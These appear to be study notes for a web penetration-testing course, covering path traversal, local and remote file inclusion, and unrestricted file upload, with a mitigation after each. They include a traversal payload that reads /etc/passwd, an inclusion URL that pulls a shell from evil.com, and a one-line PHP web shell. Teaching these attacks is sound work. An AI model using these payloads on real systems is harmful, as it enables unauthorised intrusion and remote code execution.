**Path Traversal**.
Some web applications need to access resources on the file system to implement the web application (such as images, static text and so on). They sometimes use parameters to define the resources.
When these parameters are user-controlled, not properly sanitized and are used to build the resource path on the file system, security issues may arise.

For example let us consider a web application that allows a visitor to download a file by requesting the following URL: `http://www.elsfoo.com/getFile?path=FileA418fS5fds.pdf`.

If the web application does not sanitize the parameter (`path`) properly an attacker could manipulate it to access the contents of any arbitrary file (access resources that are not intended to be accessed).

This attack, also known as the "dot-dot-slash" attack (`../`), is usually performed by means of those characters that allow us to move up in the directory tree. By prefacing the sequence with `../` it may be possible to access directories that are hierarchically higher than the one from which we are picking the file.
Note that can be used both *relative path* and *absolute path* addressing.

A specific sequence can be used to terminate the current filename. This sequence takes the name of "NULL BYTE": `%00`. This can be useful to terminate the string in case something else is appended to it by the web application.
Note that the "NULL BYTE" does not work with PHP versions >= 5.3.4.

In order to *prevent path traversal* attacks, we need to filter any malicious sequences from the input parameters. Web applications that perform filtering operations on the nasty characters (e.g. `.`, `/`, `\`, `../`, `..\`, `%00`) should be aware of different encodings.

**File Inclusion** vulnerabilities are divided into Remote and Local, depending on where the file to include is located.

*Local File Inclusion* (LFI).
This type of vulnerability is usually found in little custom made CMSs where pages are loaded with an `include` and their paths taken from the input.

For example, let us suppose that the target application changes its content depending on the location of the visitor. The URL will be something like this: `http://target.site/index.php?location=IT` and that the PHP code handles the parameter as follows: `<?php include ("loc/" . $_GET['location']); ?>`.

If instead, the code looks like this: `<?php include ($_GET['location'] . "/template.tlp"); ?>`, a valid exploit would be: `index.php?location=../../../etc/passwd%00`, where `%00` is the null character that terminates the string.

*Remote File Inclusion* (RFI) works the same way as LFI. The only difference is that the file to be included is pulled remotely.
Our aim in this case is not just to read but, to include our own code in the execution.

For example, an exploitable URL would look like this: `vuln.php?page=http://evil.com/shell.txt`.
In this case, `shell.txt` (containing PHP code), will be included in the page and executed. A common exploit to this vulnerability is to include a PHP shell that would let the hacker or the pentester execute any code on the server.
Exploiting RFI requires that you have a PHP shell uploaded somewhere and accessible from the internet.
Note that there are plenty of shells you can find online, each one with its features and specific functions.

It is important to know that the file included must not have the `.php` extension, otherwise the code within the included file will run on the attacker web server machine, instead of the target web application.

This vulnerability should be checked when an `include` is thought to be present in the code.

Note that the RFI is possible because the `allow_url_include` directive is set to `On` within `php.ini`. It is good practice to set it to `Off`.

**Unrestricted File Upload** vulnerability is one of the most dangerous vulnerabilities a web application can suffer from.
This vulnerability affects all the web applications that allow file upload, without properly enforcing restrictive policies on the maximum size of the file (DoS), and the nature of the file (Image, PDF, PHP).

The impact of this vulnerability depends opon how the file is used by the web application.
If the web application does not perform checks on the filetype uploaded, a malicious user could upload a shell and execute it by browsing to the uploaded file (if the path and file name is predictable or known).
```
<?php
	exec($_GET['command']);
?>
```
With this simple shell, the attacker would be able to launch arbitrary OS commands by specifying them in the URL: `http://fileupload.site/images/myshell.php?command=<Command>`.

Note that other attacks can be run, such as: creating phishing pages, storing XSS, defacing of the web application.

In order for the application to be vulnerable, the following conditions must apply:
- the filetype is not checked against a whitelist of allowed formats
- the filename and path of the uploaded file is known to the attacker or is guessable
- the folder in which the file is placed allows the execution of server-side scripts.

In order to *prevent unrestricted file upload* vulnerability, web developers should inspect the uploaded file at two different layers:
- metadata (name, extension, size)
- actual content.

The best defense is to actually determine the file type by inspecting the content of the uploaded file. This can be achieved using libraries for binary formats or parsers for text files however, this is not the only recommendation. Web developers must limit the file size as well as the file name, set proper permission on the upload folder, filter and discard special characters, use virus scanners and so on.

---
---
